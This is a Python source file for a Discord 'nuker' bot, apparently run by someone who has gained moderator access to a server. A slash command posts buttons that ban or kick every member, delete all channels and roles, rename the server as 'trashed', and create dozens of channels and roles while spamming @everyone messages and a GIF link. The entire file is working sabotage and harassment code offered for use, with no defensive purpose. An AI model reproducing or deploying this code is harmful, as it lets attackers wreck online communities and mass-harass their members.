import os
import asyncio
import discord
from discord.ext import commands
from discord import ui, app_commands
print("Import successful")
print("Pycord version:", discord.__version__)
from colorama import Fore, init
import json



# Initialize colorama for Windows compatibility
init()

# Load configuration from config.json
try:
    with open('config.json', encoding='utf-8') as config:
        setup = json.load(config)
except FileNotFoundError:
    print(f"{Fore.RED}Error: config.json not found!{Fore.RESET}")
    exit(1)

token = setup.get('bot_token')
prefix = setup.get('prefix', '!')
namesforchannel = setup.get('channelnames', 'ราชาแฮกเกอร์ตัวจริงมาแล้ววว')
namesforroles = setup.get('rolenames', 'โนวันอิสเฮีย')
spam_text_full = setup.get('spam_text', '@everyone I L0ovE LOVE TAST3 https://tenor.com/view/yabujin-pnkware-umilgang-1616-claws-gif-5298462550873508806')

# Parse spam_text into text and URL
spam_text_parts = spam_text_full.split()
spam_text = ' '.join(spam_text_parts[:-1]) if len(spam_text_parts) > 1 else spam_text_full
spam_url = spam_text_parts[-1] if len(spam_text_parts) > 1 else ''

# Validate spam_text and spam_url
if not isinstance(spam_text, str) or not spam_text:
    print(f"{Fore.RED}Error: Invalid spam_text in config.json! Using default: '@everyone I L0ovE LOVE TAST3'{Fore.RESET}")
    spam_text = "@everyone I L0ovE LOVE TAST3"
    spam_url = ""

# Set up intents
intents = discord.Intents.default()
intents.members = True
intents.presences = True
intents.message_content = True

# Initialize the bot with the prefix
bot = commands.Bot(command_prefix=prefix, intents=intents)

# Utility function for console setup
def axeop():
    os.system('title THis iSA BOt Forr funn!!!11' if os.name == 'nt' else 'clear')
    print(f"{Fore.LIGHTCYAN_EX} CAn Y0u fE3l th1s Lov03 taste? {Fore.RESET}")

# Bot startup event with command sync
@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.dnd, activity=discord.Game(name="LOVE L0VE TAST3"))
    axeop()
    print(f"""{Fore.MAGENTA}

░█─── █▀▀█ ▀█─█▀ ░█▀▀▀ 　 ▀▀█▀▀ ─█▀▀█ ░█▀▀▀█ ▀▀█▀▀ █▀▀█ 
░█─── █▄▀█ ─█▄█─ ░█▀▀▀ 　 ──█── ░█▄▄█ ─▀▀▀▄▄ ─░█── ──▀▄ 
░█▄▄█ █▄▄█ ──▀── ░█▄▄▄ 　 ──▀── ░█─░█ ░█▄▄▄█ ─░█── █▄▄█
    {Fore.RESET}""")
    print(f"{Fore.GREEN}Bot is online as {bot.user}!{Fore.RESET}")
    print(f"{Fore.YELLOW}Bot is in the following guilds:{Fore.RESET}")
    for guild in bot.guilds:
        print(f" - {guild.name} (ID: {guild.id})")
    print(f"{Fore.YELLOW}Syncing slash commands...{Fore.RESET}")
    try:
        synced_global = await bot.tree.sync()
        print(f"{Fore.GREEN}Synced {len(synced_global)} global command(s){Fore.RESET}")
        guild_id = "1348566541645516840"  # Replace with your server ID
        try:
            synced_guild = await bot.tree.sync(guild=discord.Object(id=guild_id))
            print(f"{Fore.GREEN}Synced {len(synced_guild)} command(s) to guild ID {guild_id}{Fore.RESET}")
        except discord.HTTPException as e:
            print(f"{Fore.RED}Failed to sync to guild {guild_id}: {e.status} - {e.text}{Fore.RESET}")
    except discord.HTTPException as e:
        print(f"{Fore.RED}Failed to sync global commands: {e.status} - {e.text}{Fore.RESET}")
    print(f"{Fore.YELLOW}Registered commands: {[cmd.name for cmd in bot.tree.get_commands()]}{Fore.RESET}")
    print(f"{Fore.YELLOW}Spam text: '{spam_text}', Spam URL: '{spam_url}'{Fore.RESET}")

# Log all messages for debugging
@bot.event
async def on_message(message):
    print(f"{Fore.YELLOW}Received message: '{message.content}' from {message.author} in {message.guild.name} (ID: {message.guild.id}){Fore.RESET}")
    await bot.process_commands(message)

# Retry function for rate-limited requests
async def execute_with_retry(action, max_retries=3):
    for attempt in range(max_retries):
        try:
            await action()
            return True
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = e.retry_after if hasattr(e, 'retry_after') else 1.0
                print(f"{Fore.YELLOW}Rate limited, retrying after {retry_after} seconds...{Fore.RESET}")
                await asyncio.sleep(retry_after)
            else:
                print(f"{Fore.RED}Error during action: {e.status} - {e.text}{Fore.RESET}")
                return False
    print(f"{Fore.RED}Failed after {max_retries} retries.{Fore.RESET}")
    return False

# Button View for LoveTaste Actions
class LoveTasteView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @ui.button(label="Spreading Love", style=discord.ButtonStyle.danger)
    async def spreading_love(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.defer()
        guild = interaction.guild
        try:
            for user in guild.members:
                await execute_with_retry(lambda: user.ban(reason="I L0ovE LOVE TAST3"))
                print(f"{Fore.LIGHTCYAN_EX}Banned {user.name}{Fore.RESET}")
                await asyncio.sleep(0.01)
            for channel in guild.channels:
                await execute_with_retry(lambda: channel.delete())
                print(f"{Fore.LIGHTCYAN_EX}Deleted channel: {channel.name}{Fore.RESET}")
                await asyncio.sleep(0.01)
            for channel in guild.channels:
                try:
                    for _ in range(2):
                        await channel.send(spam_text)
                        print(f"{Fore.LIGHTCYAN_EX}Spammed text '{spam_text}' in {channel.name}{Fore.RESET}")
                        if spam_url:
                            await channel.send(spam_url)
                            print(f"{Fore.LIGHTCYAN_EX}Spammed URL '{spam_url}' in {channel.name}{Fore.RESET}")
                        await asyncio.sleep(0.01)
                except Exception as e:
                    print(f"{Fore.RED}Failed to spam in {channel.name}: {e}{Fore.RESET}")
            for role in guild.roles:
                await execute_with_retry(lambda: role.delete())
                print(f"{Fore.LIGHTCYAN_EX}Deleted role: {role.name}{Fore.RESET}")
                await asyncio.sleep(0.01)
            await execute_with_retry(lambda: guild.edit(
                name="TRASHED BY I L0ovE LOVE TAST3",
                description="I L0ovE LOVE TAST3",
                reason="I L0ovE LOVE TAST3",
                icon=None,
                banner=None
            ))
            print(f"{Fore.LIGHTCYAN_EX}Guild edited successfully{Fore.RESET}")
            for _ in range(50):
                try:
                    new_channel = await guild.create_text_channel(name=namesforchannel)
                    print(f"{Fore.LIGHTCYAN_EX}Created channel: {namesforchannel}{Fore.RESET}")
                    for _ in range(2):
                        await new_channel.send(spam_text)
                        print(f"{Fore.LIGHTCYAN_EX}Spammed text '{spam_text}' in {new_channel.name}{Fore.RESET}")
                        if spam_url:
                            await new_channel.send(spam_url)
                            print(f"{Fore.LIGHTCYAN_EX}Spammed URL '{spam_url}' in {new_channel.name}{Fore.RESET}")
                        await asyncio.sleep(0.01)
                    await guild.create_role(name=namesforroles, color=discord.Color.random())
                    print(f"{Fore.LIGHTCYAN_EX}Created role: {namesforroles}{Fore.RESET}")
                except Exception as e:
                    print(f"{Fore.RED}Creation error: {e}{Fore.RESET}")
                await asyncio.sleep(0.01)
            await interaction.followup.send("Nuke completed with spamming!")
        except Exception as e:
            print(f"{Fore.RED}Nuke process failed: {e}{Fore.RESET}")
            await interaction.followup.send("Nuke failed due to an error!")

    @ui.button(label="Ban All", style=discord.ButtonStyle.danger)
    async def ban_all(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.defer()
        guild = interaction.guild
        for user in guild.members:
            await execute_with_retry(lambda: user.ban(reason="I L0ovE LOVE TAST3"))
            print(f"{Fore.LIGHTCYAN_EX}[+][BANNED]{Fore.LIGHTYELLOW_EX} {user.name}{Fore.RESET}")
            await asyncio.sleep(0.01)
        await interaction.followup.send("Mass ban completed!")

    @ui.button(label="Kick All", style=discord.ButtonStyle.danger)
    async def kick_all(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.defer()
        guild = interaction.guild
        for user in guild.members:
            await execute_with_retry(lambda: user.kick(reason="I L0ovE LOVE TAST3"))
            print(f"{Fore.LIGHTCYAN_EX}[+][KICKED]{Fore.LIGHTYELLOW_EX} {user.name}{Fore.RESET}")
            await asyncio.sleep(0.01)
        await interaction.followup.send("Mass kick completed!")

    @ui.button(label="Delete Channels", style=discord.ButtonStyle.danger)
    async def delete_channels(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.defer()
        guild = interaction.guild
        for channel in guild.channels:
            await execute_with_retry(lambda: channel.delete())
            print(f"{Fore.LIGHTCYAN_EX}Deleted channel: {channel.name}{Fore.RESET}")
            await asyncio.sleep(0.01)
        await interaction.followup.send("Channel deletion completed!")

    @ui.button(label="Delete Roles", style=discord.ButtonStyle.danger)
    async def delete_roles(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.defer()
        guild = interaction.guild
        for role in guild.roles:
            await execute_with_retry(lambda: role.delete())
            print(f"{Fore.LIGHTCYAN_EX}Deleted role: {role.name}{Fore.RESET}")
            await asyncio.sleep(0.01)
        await interaction.followup.send("Role deletion completed!")

    @ui.button(label="Custom Message", style=discord.ButtonStyle.primary)
    async def custom_message(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.defer()
        await interaction.followup.send(f"{spam_text_full}")

# Slash command definition
@bot.tree.command(name="lovetaste", description="Display LoveTaste action buttons")
async def lovetaste(interaction: discord.Interaction):
    view = LoveTasteView()
    await interaction.response.send_message("Select an action:", view=view, ephemeral=False)

# Fallback prefix command
@bot.command()
async def lovetaste(ctx):
    view = LoveTasteView()
    await ctx.send("Select an action (slash command syncing...):", view=view)

# Error handler for command errors
@bot.event
async def on_command_error(ctx, error):
    print(f"{Fore.RED}Command error: {error}{Fore.RESET}")
    if hasattr(ctx, 'interaction') and ctx.interaction:
        await ctx.interaction.response.send_message(f"An error occurred: {error}", ephemeral=True)
    else:
        await ctx.send(f"An error occurred: {error}")

# Start the bot
bot.run(token)